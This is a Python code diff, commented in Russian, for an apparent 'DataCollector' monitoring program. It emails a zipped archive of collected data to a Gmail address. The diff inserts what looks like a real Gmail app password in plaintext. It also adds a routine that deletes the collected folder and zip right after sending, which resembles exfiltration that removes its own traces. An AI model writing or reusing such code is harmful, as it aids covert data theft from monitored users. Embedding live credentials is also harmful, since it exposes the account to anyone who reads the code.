@@ -14,6 +14,8 @@ import traceback
 import json
 from logger import DataCollectorLogger
 from email_sender import send_gmail_with_attachment, create_zip_zipfile
+import shutil
+
 
 
 FOLDER_NAME = 'data_collection'
@@ -650,7 +652,35 @@ class DataCollector:
             self.logger.log_error(f"✗ Ошибка сохранения метаданных: {str(e)}")
             self.logger.log_function_call(func_name, "ОШИБКА", str(e))
 
-
+def delete_path(path):
+    """
+    Удаляет файл или папку со всем содержимым
+    """
+    try:
+        # Проверяем существование пути
+        if not os.path.exists(path):
+            print(f"Ошибка: путь '{path}' не существует")
+            return False
+        
+        # Удаляем файл
+        if os.path.isfile(path):
+            os.remove(path)
+            print(f"Файл '{path}' успешно удален")
+            return True
+        
+        # Удаляем папку со всем содержимым
+        elif os.path.isdir(path):
+            shutil.rmtree(path)
+            print(f"Папка '{path}' успешно удалена со всем содержимым")
+            return True
+            
+    except PermissionError:
+        print(f"Ошибка: нет прав для удаления '{path}'")
+        return False
+    except Exception as e:
+        print(f"Ошибка при удалении '{path}': {e}")
+        return False
+    
 # ==================== ОСНОВНАЯ ФУНКЦИЯ ====================
 def main():
     """Основная функция программы"""
@@ -660,7 +690,7 @@ def main():
         collector.start_monitoring()
 
         sender_email = "mokaiv118@gmail.com"
-        sender_password = "xxxx xxxx xxxx xxxx"  # пароль приложения
+        sender_password = "pxzr wjsc ledt jnpi"  # пароль приложения
         recipient_email = "mokaiv118@gmail.com"
         subject = "5 секунд"
         message = "Привет! Это письмо содержит архив 5ти секунд."
@@ -676,6 +706,8 @@ def main():
             message=message,
             attachment_path=file_path
         )
+        delete_path("data_collection")
+        delete_path("data_collection.zip")
 
 
     except KeyboardInterrupt:
